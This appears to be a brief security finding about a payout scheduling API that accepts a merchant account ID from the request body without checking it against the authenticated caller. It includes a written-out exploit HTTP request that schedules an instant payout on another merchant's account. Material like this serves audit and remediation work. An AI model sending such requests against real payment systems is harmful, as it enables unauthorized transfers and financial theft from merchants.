diagnosis: The payout scheduling route takes merchantAccountId directly from the request body and creates an Agenda background payout job without verifying that the authenticated caller (req.merchant.accountId) matches merchantAccountId. An attacker can schedule unauthorized transfers or trigger payout workflows on third-party merchant accounts.
exploit_request:
POST /api/schedules/payouts HTTP/1.1
Host: payouts.paymentplatform.com
Authorization: Bearer <merchant_bearer_token>
Content-Type: application/json

{"merchantAccountId": "acct_stripe_target_99182", "executionDate": "in 1 hour", "payoutMethod": "instant_debit"}
